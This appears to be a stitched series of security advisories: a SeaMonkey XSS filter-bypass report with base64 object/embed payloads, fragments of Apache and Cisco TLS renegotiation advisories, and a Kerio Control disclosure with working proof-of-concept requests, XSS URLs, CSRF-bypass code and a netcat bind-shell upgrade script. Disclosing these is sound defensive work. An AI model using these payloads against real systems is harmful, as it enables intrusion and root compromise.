Javascript Application popup window proving the existence of this vulnerability.\r\n\r\n\r\nProof of Concept #2\r\n\r\na) Goto Edit and then Mail & Newsgroups Account Settings\r\nb) Under the Signature Text, insert the Payload and enable 'Use HTML'\r\nc) Close the menu and Click on \"Compose\" (compose in HTML) to create a new email\r\nd) You should get a popup the moment new Email editor window opens up proving the existence of this vulnerability.\r\n\r\n\r\nProof of Concept #3\r\n\r\na) Create a new text file on your desktop (local computer), insert the POC payload and save it as test.html (HTML)\r\nb) Goto Edit and then Mail & Newsgroups Account Settings\r\nc) Below the Signature Text box, enable 'Attach the signature from a file instead'  \r\nd) Click Choose and select the 'test.html' file which you created in step a.\r\ne) Click on \"Compose\" (Compose in HTML) and you should be able to see the Javascript popup proving the existence of this vulnerability.\r\n\r\n\r\nPayload #1\r\n\r\n<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydChkT2NVbWVOdC5Db29LaWUpOzwvc2NyaXB0Pg==\"></object>\r\n\r\n\r\nPayload #2\r\n\r\n<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDov\r\nL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5\r\nL3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw\r\nIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlZ1bG5lcmFi\r\nbGUiKTs8L3NjcmlwdD48L3N2Zz4=\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>\r\n\r\n\r\n1.3 \r\nPOC Technical Description:\r\n\r\nHere, we used the data URI payload as a value assigned to the \u2018data\u2019 attribute of the \u2018object\u2019 tag. The <object> tag is used to include objects\r\nsuch as images, audio, videos, Java applets, ActiveX, PDF, and Flash. The \u2018data\u2019 attribute of the object tag defines a URL that refers to the\r\nobject\u2019s data. Data in the \"data:\" URI is encoded as a base64 string:\r\n\r\nBase64-encoded payload: PHNjcmlwdD5hbGVydCgiVnVsbmVyYWJsZSIpOzwvc2NyaXB0Pg==\r\n\r\nBase64-decoded payload: <script>alert(\"Vulnerable\");</script>\r\n\r\nWhen the browser loads the object tag, it loads an object (in our case, it\u2019s a javascript) assigned to its data attribute. This causes execution \r\nof our javascript. We were able to bypass the application blacklist filter because of the base64-encoded payload. \r\n\r\n\r\n\r\n\r\n\r\n2.0\r\nSeamonkey HTML Composer Preview - Input Filter Bypass Vulnerability\r\n\r\n\r\nDetails:\r\nBy default, html tags like <script> alert/prompt are being filtered in the Composer preview feature however, using the <object> and \r\nor <embed> tags and base64 encoded payloads it is possible to bypass the current filters and execute script code. Even though I \r\nnoticed that once you save it as an .html file, all normal payloads like <script>alert(1)</script> work. Its an HTML composer, \r\nmaybe its not allowed to filter any dangerous / malicious code requests by default and I am definitely not challenging that fact \r\nat all. I just felt its important to highlight the fact that if all other tags are being blocked in the preview, then this one \r\nactually bypasses the current Seamonkey Composer preview filters and still works. \r\n\r\n\r\nVulnerable Product(s):\r\n\t\t\t\t[+] Seamonkey 2.17.1 - Latest Release \r\n\r\nVulnerable Module(s):\r\n\t\t\t\t[+] Composer (CTRL+4)\r\n\r\nVulnerable Section(s):\r\n\t\t\t\t[+] HTML Source\r\n   \r\n\r\n2.1\r\n        \r\nProof of Concept:\r\n\r\na) Open New Seamonkey Composer Window \r\nb) Goto <HTML> Source\r\nc) Copy/Paste any one of the payloads mentioned under the \"Payload\" section, anywhere in the Code before </body> tag.\r\n\r\nExample Code that i used for this POC:\r\n\r\n<html>\r\n<head>\r\n<meta content=\"text/html; charset=ISO-8859-1\"\r\nhttp-equiv=\"Content-Type\">\r\n<title>testtesttest</title>\r\n</head>\r\n<body>\r\n<br>\r\n<h4> </h4>\r\n<h2> <object\r\ndata=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiVnVsbmVyYWJsZSIpOzwvc2NyaXB0Pg==\"></object>\r\n</h2>\r\n</body>\r\n</html>\r\n\r\nd) Click on Preview and you should be able to see a Javascript proving the existence of this Filter Bypass Vulnerability\r\n\r\n\r\nPayload #1\r\n<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiVnVsbmVyYWJsZSIpOzwvc2NyaXB0Pg==\"></object>\r\n\r\n\r\nPayload #2\r\n<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDov\r\nL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5\r\nL3hsaW5rIiB\r\n2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw\r\nIiBpZD0ieHNzIj\r\n48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlZ1bG5lcmFi\r\nbGUiKTs8L3Njcml\r\nwdD48L3N2Zz4=\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>\r\n\r\n\r\n2.3\r\n\r\nInteresting Raw Application Logs captured during the entire process of testing:\r\n\r\n\r\n[JavaScript Error: \"ReferenceError: dOcUmeNt is not defined\" {file: \"data:text/html;base64,\r\nPHNjcmlwdD5hbGVydChkT2NVbWVOdC5Db29LaWUpOzwvc2NyaXB0Pg==\" line: 1}]\r\n[JavaScript Error: \"TypeError: \r\nthis.tabbox is null\" {file: \"chrome://global/content/bindings/tabbox.xml\" line: 480}]\r\n[JavaScript Error: \"TypeError: t\r\nhis.tabbox is null\" {file: \"chrome://global/content/bindings/tabbox.xml\" line: 480}]\r\n[JavaScript Warning: \r\n\"The character encoding of a framed document was not declared.

If an attacker could perform a man in the middle attack at the\r\nstart of a TLS connection, the attacker could inject arbitrary content at\r\nthe beginning of the user's session. The flaw is with TLS renegotiation and\r\npotentially affects any software that supports this feature. Attacks\r\nagainst the HTTPS protocol are known, with the severity of the issue\r\ndepending on the safeguards used in the web application. Until the TLS\r\nprotocol and underlying libraries are adjusted to defend against this\r\nvulnerability, a partial, temporary workaround has been applied to Apache\r\nthat disables client initiated TLS renegotiation. This update does not\r\nprotect against server initiated TLS renegotiation when using\r\nSSLVerifyClient and SSLCipherSuite on a per Directory or Location basis.\r\nUsers can defend againt server inititiated TLS renegotiation attacks by\r\nadjusting their Apache configuration to use SSLVerifyClient and\r\nSSLCipherSuite only on the server or virtual host level. (CVE-2009-3555)\r\n\r\nIt was discovered that mod_proxy_ftp in Apache did not properly sanitize\r\nits input when processing replies to EPASV and PASV commands. An attacker\r\ncould use this to cause a denial of service in the Apache child process.\r\n(CVE-2009-3094)\r\n\r\nAnother flaw was discovered in mod_proxy_ftp. If Apache is configured as a\r\nreverse proxy, an attacker could send a crafted HTTP header to bypass\r\nintended access controls and send arbitrary commands to the FTP server.\r\n(CVE-2009-3095)\r\n\r\n\r\nUpdated packages for Ubuntu 6.06 LTS:\r\n\r\n  Source archives:\r\n\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.0.55-4ubuntu2.9.di

The vulnerability exists in how the protocol handles\r\nsession renegotiation and exposes users to a potential man-in-the-middle\r\nattack.\r\n\r\nThis advisory is posted at\r\nhttp://www.cisco.com/warp/public/707/cisco-sa-20091109-tls.shtml.\r\n\r\nAffected Products\r\n=================\r\n\r\nCisco is currently evaluating products for possible exposure to these\r\nTLS issues. Products will only be listed in the Vulnerable Products or\r\nProducts Confirmed Not Vulnerable sections of this advisory when a final\r\ndetermination about product exposure is made. Products that are not\r\nlisted in either of these two sections are still being evaluated.\r\n\r\nVulnerable Products\r\n- -------------------\r\n\r\nThis section will be updated when more information is available.\r\n\r\nProducts Confirmed Not Vulnerable\r\n- ---------------------------------\r\n\r\nThe following products are confirmed not vulnerable:\r\n\r\n  * Cisco AnyConnect VPN Client\r\n\r\nThis section will be updated when more information is available.\r\n\r\nDetails\r\n=======\r\n\r\nTLS and its predecessor, SSL, are cryptographic protocols that provide\r\nsecurity for communications over IP data networks such as the Internet.\r\nAn industry-wide vulnerability exists in the TLS protocol that could\r\nimpact any Cisco product that uses any version of TLS and SSL. The\r\nvulnerability exists in how the protocol handles session renegotiation\r\nand exposes users to a potential man-in-the-middle attack.\r\n\r\nThe following Cisco Bug IDs are being used to track potential exposure\r\nto the SSL and TLS issues. The bugs listed below do not confirm\r\nthat a product is vulnerable, but rather that the product is under\r\ninvestigation by the appropriate product teams.\r\n\r\nRegistered Cisco customers can view these bugs via Cisco's Bug Toolkit:\r\nhttp://www.cisco.com/pcgi-bin/Support/Bugtool/launch_bugtool.pl\r\n\r\n+------------------------------------------------------------+\r\n|          Product

The CVSS scoring in\r\nthis Security Advisory is done in accordance with CVSS version 2.0.\r\n\r\nCVSS is a standards-based scoring method that conveys vulnerability\r\nseverity and helps determine urgency and priority of response.\r\n\r\nCisco has provided a base and temporal score. Customers can then\r\ncompute environmental scores to assist in determining the impact of the\r\nvulnerability in individual networks.\r\n\r\nCisco has provided an FAQ to answer additional questions regarding CVSS\r\nat:\r\n\r\nhttp://www.cisco.com/web/about/security/intelligence/cvss-qandas.html\r\n\r\nCisco has also provided a CVSS calculator to help compute the\r\nenvironmental impact for individual networks at:\r\n\r\nhttp://intellishield.cisco.com/security/alertmanager/cvss\r\n\r\n* TLS Renegotiation Vulnerability (all Cisco Bugs above)\r\n\r\nCVSS Base Score - 4.3\r\n    Access Vector -            Network\r\n    Access Complexity -        Medium\r\n    Authentication -           None\r\n    Confidentiality Impact -   None\r\n    Integrity Impact -         Partial\r\n    Availability Impact -      None\r\n\r\nCVSS Temporal Score - 4.1\r\n    Exploitability -           Functional\r\n    Remediation Level -        Unavailable\r\n    Report Confidence -        Confirmed\r\n\r\n\r\nImpact\r\n======\r\n\r\nThis section will be updated when more information is available.\r\n\r\nSoftware Versions and Fixes\r\n===========================\r\n\r\nThis section will be updated to include fixed software versions for\r\naffected Cisco products as they become available.\r\n\r\nWorkarounds\r\n===========\r\n\r\nWorkarounds are being investigated. This section will be updated when\r\nmore information becomes available.\r\n\r\nObtaining Fixed Software\r\n========================\r\n\r\nCisco has released free software updates that address this\r\nvulnerability. Prior to deploying software, customers should consult\r\ntheir maintenance provider or check the software for feature set\r\ncompatibility and known issues specific to their environment.\r\n\r\nCustomers may only install and expect support for the feature\r\nsets they have purchased. By installing, downloading, accessing\r\nor otherwise using such software upgrades, customers agree to be\r\nbound by the terms of Cisco's software license terms found at\r\nhttp://www.cisco.com/en/US/docs/general/warranty/English/EU1KEN_.html,\r\nor as otherwise set forth at Cisco.com Downloads at\r\nhttp://www.cisco.com/public/sw-center/sw-usingswc.shtml.\r\n\r\nDo not contact psirt@cisco.com or security-alert@cisco.com for software\r\nupgrades.\r\n\r\nCustomers with Service Contracts\r\n- --------------------------------\r\n\r\nCustomers with contracts should obtain upgraded software through their\r\nregular update channels. For most customers, this means that upgrades\r\nshould be obtained through the Software Center on Cisco's worldwide\r\nwebsite at http://www.cisco.com.\r\n\r\nCustomers using Third Party Support Organizations\r\n- -------------------------------------------------\r\n\r\nCustomers whose Cisco products are provided or maintained through prior\r\nor existing agreements with third-party support organizations, such\r\nas Cisco Partners, authorized resellers, or service providers should\r\ncontact that support organization for guidance and assistance with the\r\nappropriate course of action in regards to this advisory.\r\n\r\nThe effectiveness of any workaround or fix is dependent on specific\r\ncustomer situations, such as product mix, network topology, traffic\r\nbehavior, and organizational mission. Due to the variety of affected\r\nproducts and releases, customers should consult with their service\r\nprovider or support organization to ensure any applied workaround or fix\r\nis the most appropriate for use in the intended network before it is\r\ndeployed.\r\n\r\nCustomers without Service Contracts\r\n- -----------------------------------\r\n\r\nCustomers who purchase direct from Cisco but do not hold a Cisco service\r\ncontract, and customers who purchase through third-party vendors but are\r\nunsuccessful in obtaining fixed software through their point of sale\r\nshould acquire upgrades by contacting the Cisco Technical Assistance\r\nCenter (TAC). TAC contacts are as follows.\r\n\r\n  * +1 800 553 2447 (toll free from within North America)\r\n  * +1 408 526 7209 (toll call from anywhere in the world)\r\n  * e-mail: tac@cisco.com\r\n\r\nCustomers should have their product serial number available and be\r\nprepared to give the URL of this notice as evidence of entitlement to a\r\nfree upgrade. Free upgrades for non-contract customers must be requested\r\nthrough the TAC.\r\n\r\nRefer to\r\nhttp://www.cisco.com/en/US/support/tsd_cisco_worldwide_contacts.html\r\nfor additional TAC contact information, including localized telephone\r\nnumbers, and instructions and e-mail addresses for use in various\r\nlanguages.\r\n\r\nExploitation and Public Announcements\r\n=====================================\r\n\r\nThis vulnerability was initially discovered by Marsh Ray and Steve\r\nDispensa from PhoneFactor, Inc.\r\n\r\nCisco is not aware of any malicious exploitation of this vulnerability.\r\n\r\nProof-of-concept exploit code has been published for this vulnerability.\r\n\r\nStatus of this Notice: INTERIM\r\n==============================\r\n\r\nTHIS DOCUMENT IS PROVIDED ON AN &quot;AS IS&quot; BASIS AND DOES NOT IMPLY\r\nANY KIND OF GUARANTEE OR WARRANTY, INCLUDING THE WARRANTIES OF\r\nMERCHANTABILITY OR FITNESS FOR A PARTICULAR USE.

Freingruber (Office Vienna)  \nR. Tavakoli (Office Vienna)  \nSEC Consult Vulnerability Lab  \n  \nAn integrated part of SEC Consult  \nBangkok - Berlin - Linz - Montreal - Moscow  \nSingapore - Vienna (HQ) - Vilnius - Zurich  \n  \nhttps://www.sec-consult.com  \n  \n=======================================================================  \n  \nVendor description:  \n-------------------  \n\"Protect your network from viruses, malware and malicious activity  \nwith Kerio Control, the easy-to-administer yet powerful all-in-one  \nsecurity solution.  \nKerio Control brings together next-generation firewall capabilities -  \nincluding a network firewall and router, intrusion detection and  \nprevention (IPS), gateway anti-virus, VPN, and web contentand  \napplication filtering. These comprehensive capabilities and unmatched  \ndeployment flexibility make Kerio Control the ideal choice for small  \nand mid-sized businesses.\"  \n  \nSource: http://www.kerio.com/products/kerio-control  \n  \n  \nBusiness recommendation:  \n------------------------  \nBy combining the vulnerabilities documented in this advisory an attacker  \ncan fully compromise a network which uses the Kerio Control appliance for  \nprotection.  \n  \nThe attacker can trick a victim to visit a malicious website which then conducts  \nthe internal attack. The attacked victim must be logged in or weak credentials  \nmust be configured which can be found with a bruteforce attack.  \n  \nThe attacker will gain a reverse root shell from the Internet to the internal  \nKerio Control firewall system. Moreover, it's possible that an internal attacker  \nuses the described vulnerabilities to escalate his privileges (low privileged  \naccount to full root shell) to steal credentials from other users on the UTM  \nappliance.  \n  \nMost vulnerabilities (RCE, CSRF bypasses, XSS, Heap Spraying) were found  \nin just two PHP scripts. Both scripts are not referenced by any other  \nPHP script nor by any binary on the system.  \nBoth scripts contain a different(!), seemingly deliberate(?) CSRF bypass  \nwhich make the vulnerabilities exploitable from the Internet to obtain a  \nreverse root shell.  \n  \nSEC Consult recommends not to use Kerio Control until a thorough security  \nreview has been performed by security professionals and all identified  \nissues have been resolved.  \n  \n  \nVulnerability overview/description:  \n-----------------------------------  \n1) Unsafe usage of the PHP unserialize function and outdated PHP version leads  \nto remote-code-execution  \nAn authenticated user (standard user or administrator) can control data, which  \ngets later unserialized. Kerio Control uses PHP 5.2.13 which was released on  \n2010-02-25. This version is more than 6 years old and several bugs were found  \nin the meantime within the unserialize function. The following CVE numbers  \nare just some examples for vulnerabilities in unserialize which lead to remote  \ncode execution:  \n-) CVE-2014-8142  \n-) CVE-2014-3515  \n-) CVE-2015-0231  \n-) CVE-2015-6834  \n-) CVE-2016-5771  \n-) CVE-2016-5773  \n  \nPHP 5.2.13 is especially affected by CVE-2014-3515. This vulnerability uses a  \ntype confusion attack to trigger a use-after-free vulnerability. It can be used  \nto read data and get full code execution. In the case of Kerio Control the  \nresult of unserialize is not reflected back to the attacker. It's therefore not  \npossible to read memory from the stack or heap (e.g. to bypass ASLR).  \n  \nNevertheless, SEC Consult developed a fully working and reliable (blind) exploit  \nfor this vulnerability which spawns a reverse root shell to the Kerio Control  \nsystem.  \nFor this exploit a user account is required. However, it's also possible to  \nconduct the attack via the Internet because the CSRF (Cross Site Request  \nForgery) check can be bypassed (see below).  \n  \nAn attacker can use this vulnerability to break into a company network via the  \nInternet by tricking a logged in user to visit a malicious website. Even if the  \nuser is currently not logged in the attacker can start a bruteforce attack to  \nobtain valid credentials to conduct the attack.  \n  \n  \n2) PHP script allows heap spraying  \nOne of the PHP scripts allows the allocation of memory inside the main binary  \n(winroute) of Kerio Control. Winroute contains the code of most services  \n(e.g. the webserver, PHP, network related functionality, ...).  \nThe memory will not be freed after finishing the request and can therefore be  \nused to spray payloads to the whole memory space.  \n  \nThis vulnerability was used in the overall exploit to defeat ASLR.  \nPlease bear in mind that it's very likely that an attacker can write a working  \nexploit without heap spraying. Fixing this vulnerability would therefore not  \nprevent the exploitation of the remote code execution vulnerability.  \nFor example, the information disclosure vulnerability from this advisory can  \nbe used to bypass ASLR as well. This would eliminate the need of heap spraying.  \n  \n  \n3) CSRF Protection Bypass  \nThe PHP scripts contain code to protect against CSRF (Cross Site Request  \nForgery) attacks. Because of the wrong usage of PHP binary  \noperations and comparisons it's possible to bypass this check. That means  \nthat an attacker can trigger requests from other websites which will be handled  \nby Kerio Control. This vulnerability allows to exploit the remote code  \nexecution vulnerability from the Internet to break into a network.  \n  \n  \n4) Webserver running with root privileges  \nThe main binary (which contains the webserver and PHP) runs with root  \nprivileges.  \n  \nKerio told SEC Consult that this vulnerability will not be fixed. SEC  \nConsult strongly recommended otherwise.  \n  \n  \n5) Reflected Cross Site Scripting (XSS)  \nKerio Control does not properly encode parameters which are reflected on the  \nwebsite. This leads to cross site scripting vulnerabilities.  \nAn attacker can abuse these vulnerabilities to modify the website or do actions  \nin the context of the attacked user.  \n  \n  \n6) Missing memory corruption protections  \nThe main binary (winroute) is not compiled as position-independent executable  \n(PIE). This allowed the use of ROP (return-oriented-programming) code to  \nbypass the not executable heap. Moreover, the stack is per default marked as  \nexecutable, but the exact location of the stack is randomized by ASLR.  \n  \n  \n7) Information Disclosure leads to ASLR bypass  \nOne of the PHP scripts leaks pointers to the stack and heap.  \nThis can be abused by attackers to bypass ASLR.  \nBecause stacks are marked as executable an attacker can therefore easily bypass  \nASLR and DEP/NX.  \n  \n  \n8) Remote Code Execution as administrator  \nNearly a year ago on 2015-10-12 Raschin Tavakoli reported a remote code  \nexecution vulnerability in the administrative web interface in the upgrade  \nfunctionality. This vulnerability is still unfixed, only the associated XSS  \nvulnerability was fixed. However, an attacker can still exploit it from the  \nInternet, e.g. by abusing the XSS vulnerability described in this advisory  \n(where the CSRF check can be bypassed).  \n  \nWith this vulnerability an attacker can gain a reverse root shell on  \nKerio Control again if a logged in administrator visits a malicious website  \non the Internet.  \nMore information can also be found in the old advisory:  \nhttps://www.exploit-db.com/exploits/38450/  \n  \n  \n9) Login not protected against brute-force attacks  \nThere are no bruteforce protections in place for the login.  \nIf an unauthenticated victim visits an attacker's website, the attacker can  \nstart a bruteforce attack to obtain valid credentials to execute the  \nremote code execution exploit. Via image-loading the attacker can detect if  \nthe current credentials are valid (without violating SOP).  \n  \n  \nProof of concept:  \n-----------------  \n1) Unsafe usage of the PHP unserialize function and outdated PHP version leads  \nto remote-code-execution  \nThe following request can be used to set the unserialize data. In this example  \na faked string is used which points to 0xffffffff (kernel memory). Unserializing  \nit will therefore crash the remote webserver (the winroute process).  \n  \nPOST /set.php HTTP/1.1  \nHost: $IP:4081  \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \nContent-Type: application/x-www-form-urlencoded  \nContent-Length: 730  \n  \nk_securityHash=x&target=k_sessionVariable&k_variable=lastDisplayed&k_value=a:18:{s:8:\"k_dbName\";s:5:\"error\";s:11:\"k_dbSummara\";s:3:\"abc\";s:14:\"k_dbIndividual\";s:3:\"abc\";s:16:\"k_dbLastUsedType\";s:3:\"abc\";s:10:\"k_dbLayout\";s:3:\"abc\";s:10:\"k_pageType\";s:3:\"abc\";s:13:\"k_periodStart\";i:123;s:11:\"k_periodEnd\";i:123;s:8:\"k_userId\";i:123;s:6:\"tabBar\";i:123;s:13:\"k_gotoElement\";i:123;s:9:\"k_protoId\";i:123;s:11:\"k_errorType\";i:123;s:16:\"k_timezoneOffset\";i:123;s:9:\"k_groupId\";i:123;s:2:\"id\";i:123;s:11:\"k_dbSummary\";C:16:\"SplObjectStorage\":152:{x:i:2;O:8:\"stdClass\":1:{i:0;a:2:{i:1;i:1;i:2;i:2;}};d:2.0851592721051977e-262;;m:a:2:{i:0;S:15:\"\\ff\\ff\\ff\\ff\\20\\00\\00\\00\\01\\00\\00\\00\\06\\00\\00\";i:1;R:3;}}s:18:\"k_historyTimestamp\";s:3:\"abc\";}  \n  \nThe following request will call unserialize on the injected data:  \n  \nGET /contentLoader.php?k_getHistoryId=1&k_securityHash=x HTTP/1.1  \nHost: $IP:4081  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \n  \nIn the example above only a denial of service will be conducted. However, an  \nattacker can change the data type to object to get full code execution on  \nthe remote system.  \n  \nSEC Consult developed a fully working exploit for this attack which spawns a  \nroot shell. Please note that this exploit was intentionally written to just  \ntarget Kerio Control 9.1.0 Build 1087. This is because hardcoded offsets  \nare used which belong to the winroute binary with the SHA256 hash:  \n2808c35528b9a4713b91f65a881dfca03088de08b6331fdee1c698523bd757b0  \nThis exploit will not be released for now.  \n  \nA real-world-attacker can detect the remote binary version by bruteforcing  \nthe object handler related to CVE-2014-3515.  \n  \n  \n2) PHP script allows heap spraying  \nThe set.php script contains the following code:  \n$p_variable = urldecode($_POST['k_variable']);  \n$p_value = urldecode($_POST['k_value']);  \n...  \n$p_session->setSessionVariable($p_variable, $p_value);  \n  \nPOST requests with the following parameters can therefore be used to allocate  \nspace on the remote system:  \nk_securityHash=x&target=k_sessionVariable&k_variable=<random_name>  \n&k_value=<payload_to_allocate>  \n  \nDuring tests it was possible to spray approximately 400 MB data in 30 seconds  \nwhich is enough to control two predictable addresses on the heap.  \n  \n  \n3) CSRF Protection Bypass  \nTwo scripts are required for the remote code execution exploit:  \n-) set.php  \n-) ContentLoader.php  \nBoth scripts contain different very interesting CSRF check bypasses.  \n  \nThe following code can be found in set.php:  \n$p_session->getCsrfToken(&$p_securityHash);  \n$p_postedHash = $_GET['k_securityHash'] || $_POST['k_securityHash'];  \nif ('' == $p_postedHash || ($p_postedHash != $p_securityHash)) {  \nexit();  \n}  \n  \nSince the programming language is PHP (and not JavaScript), the above code code  \ndoes not work as expected. $p_postedHash can only become 0 or 1 because || is a  \nlogical operator. The if-condition compares the valid token with the posted one  \nvia the != operator, however, this will not check if types are the same.  \nIf k_securityHash is set (either via GET or POST) to any value, the above code  \nwill compare the number 1 with a string, which will always bypass the check.  \nIt's therefore enough to set k_securityHash to any value to bypass the CSRF  \nprotection.  \n  \nThe following code can be found in contentLoader.php:  \n$p_session->getCsrfToken(&$p_securityHash);  \n$p_postedHash = $_GET['k_securityHash'];  \n...  \nif (!$p_session || ('' == $p_postedHash && $p_postedHash != $p_securityHash)) {  \n$p_page = new p_Page();  \n$p_page->p_jsCode('window.top.location = \"index.php\";');  \n$p_page->p_showPageCode();  \ndie();  \n}  \n  \nNow the programmers only use the GET parameter, however, they changed the  \nlogical operator in the if condition from || to && which means that the CSRF  \ncheck will only be applied if $p_postedHash is empty. It's therefore again  \nenough to set k_securityHash to any value to bypass the check.  \n  \n  \n4) Webserver running with root privileges  \nNo proof of concept necessary.  \n  \n  \n5) Reflected Cross Site Scripting (XSS)  \nIn the following request the k_historyTimestamp parameter is prone to XSS:  \nhttps://<IP>:4081/contentLoader.php?k_dbName=x&k_securityHash=x  \n&k_historyTimestamp=aa%22;alert(1)%3b//  \n  \nIn the same request the id parameter can be used to inject JavaScript code.  \nNote that the attack can only be conducted against administrative users.  \nUsers with standard privileges can only access pages with k_dbName set to one  \nof the following values:  \n-) accStats  \n-) prefs  \n-) dialup  \n-) error  \n  \nIn such a case Kerio Control adds code like the following  \n(in this example k_dbName=dialup):  \nvar k_newDbName = \"<kerio:text id=\"tabCaption_dialup\"/>\";  \n  \nThe \" characters within the string are not correctly encoded.  \nThis will lead to the termination of the JavaScript execution. Because the  \ninjected payload is stored after this code, the attacker must bypass this  \ncode to ensure that the payload gets executed. This is only possible if  \nthe attacked user is an administrator because administrators can load any  \ndbName. By setting k_dbName to an invalid dbName (e.g. to 'x'), code like  \nthe following will be added instead (which does not crash):  \nvar k_newDbName = \"\";  \n  \nAnother XSS can be found at:  \nhttps://<IP>:4081/admin/internal/dologin.php?hash=%0D%0A\"><script>alert(1);</script><!--  \n  \n  \n6) Missing memory corruption protections  \nNo proof of concept necessary.  \n  \n  \n7) Information Disclosure leads to ASLR bypass  \nThe following request returns information to the currently logged in user  \n(e.g. session token and username):  \n  \nGET /nonauth/getLoginType.js.php HTTP/1.1  \nHost: $IP:4081  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \n  \nThe following is a typical response:  \n  \nHTTP/1.1 200 OK  \nConnection: Close  \nContent-type: text/html  \nDate: Tue, 24 Aug 2016 11:47:34 GMT  \nServer: Kerio Control Embedded Web Server  \nX-UA-Compatible: IE=edge  \n  \nk_loginParams.k_loginType = \"loginUnlock\";k_loginParams.k_nonauthToken =  \n\"0xb59066a8\";k_loginParams.k_sessionToken =  \n\"bc7c9ae78f01e498b7c935b4ad521b664d4e2c5574bde30cdf57851a58763660\";k_loginParams.k_loggedUser  \n= {k_asocName: \"user\", k_fullName: \"user\"};  \n  \nThe above response contains a valid pointer (0xb59066a8). In most cases this  \npointer will point to the heap. However, sometimes this pointer will point  \ninto a readable and writeable region behind a stack-region.  \nThe target location always stores the same data. During the analysis no  \nfurther effort was spent on analysing this behaviour.  \n  \nThe pointer will also be disclosed if the user is already logged out.  \nIn such a case the response looks like:  \n  \nHTTP/1.1 200 OK  \nConnection: Close  \nContent-type: text/html  \nDate: Tue, 24 Aug 2016 12:04:44 GMT  \nServer: Kerio Control Embedded Web Server  \nX-UA-Compatible: IE=edge  \n  \nk_loginParams.k_loginType = \"loginCommon\";k_loginParams.k_nonauthToken =  \n\"0xb2ee208\";  \n  \n  \nAn attack scenario can be:  \n-) The attacker tricks a victim to visit the attacker's malicious website  \n-) The attacker's website uses the CSRF bypass and the identified XSS  \nvulnerability to embed a malicious script inside the Kerio Control website  \n-) The attacker's website iframes the Kerio Control website to trigger the  \nexecution of the XSS payload  \n-) The XSS payload runs on the same domain and can therefore send requests  \nand read responses. This means the attacker can send requests to  \ngetLoginType.js.php to obtain a memory pointer.  \n-) If the memory pointer is within a specific range (e.g. the highest nibble  \nis zero), it's a pointer to the heap. In such a case the RCE vulnerability  \ncan be used to crash and restart the server. After that the same check can  \nbe done again.  \n-) If the memory pointer points near a stack (highest nibble is 0xb), the  \npointer can be used to calculate the base address of a stack.  \n-) Now the attacker knows the location of a stack (all stacks are marked as  \nreadable, writeable and executable). He can now easily bypass ASLR and DEP.  \n  \n  \n8) Remote Code Execution as administrator  \nAn attacker can create a malicious upgrade image with the following  \ncommands:  \ncat upgrade.sh  \n#!/bin/bash  \nnc -lp 9999 -e /bin/bash &  \n  \ntar czf upgrade.tar.gz *  \nmv upgrade.tar.gz upgrade.img  \n  \nThe image can be uploaded in the administrative web interface.  \nThis will bind a root shell on port 9999. The complete attack can also be  \nconducted via the cross site scripting vulnerability described in this  \nadvisory (XSS in contentLoader.php). This enables an attacker to conduct  \nthe attack from the Internet to obtain a reverse shell on Kerio Control.  \n  \n  \n9) Login not protected against brute-force attacks  \nValid credentials can be obtained via a brute-force attack.  \nIt's enough to send a POST request to /internal/dologin.php with the  \nparameters kerio_username and kerio_password set. A remote attacker  \ncan detect if the credentials are correct without reading the  \nresponse (SOP would not allow to read the response). This is possible  \nbecause /internal/photo will only return a valid image if the user is  \ncurrently logged in. The attacker can load an image from this URL and  \ncheck if loading was successful to leak the information if the  \ncredentials are valid or not.  \nThe following code demonstrates this:  \n<img src=\"https://<Kerio-IP>/internal/photo\" onerror=not_logged_in();  \nonload=logged_in();></img>  \n  \n  \nVulnerable / tested versions:  \n-----------------------------  \nThe following product versions were found to be vulnerable which were the  \nlatest versions available at the time of the discovery:  \nv9.1.0 (Build 1087)  \nv9.1.1 (Build 1324)  \n  \n  \nVendor contact timeline:  \n------------------------  \n2016-08-29: Contacting vendor through website  \n(bug report: bugreports@support.kerio.com) Ticket-ID: MYW-768664  \n2016-08-31: No answer, contacting CTO of Kerio via email  \n2016-09-01: Received security contact with PGP & S/MIME certificate  \n2016-09-01: Transmission of PGP encrypted advisory to Kerio  \n2016-09-09: Received answer, Kerio confirms vulnerabilities 1,2,3,5,6,7  \nStatement to vulnerability 9:  \n\"the feature already is in the product.\"  \nStatement to vulnerabilities 4 (Webserver running with root  \nprivileges) and 8 (Remote Code Execution as administrator):  \n\"I do not consider this a vulnerability\"  \nUpdate including a fix will be available on 2016-09-20  \n2016-09-09: SEC Consult informed Kerio to re-think the decision  \nnot fixing the vulnerabilities 4, 8 and 9  \nSEC Consult highly recommends to fix all reported issues  \n2016-09-13: SEC Consult informed Kerio that the advisory will be  \nreleased on 2016-09-22  \n2016-09-20: Kerio releases patch for Kerio Control  \n2016-09-22: Coordianted release of security advisory  \n  \n  \nSolution:  \n---------  \nThe vendor has released version 9.1.3 on 20th September which, according  \nto the vendor, fixes the vulnerabilities 1,2,3,5,6,7.  \n 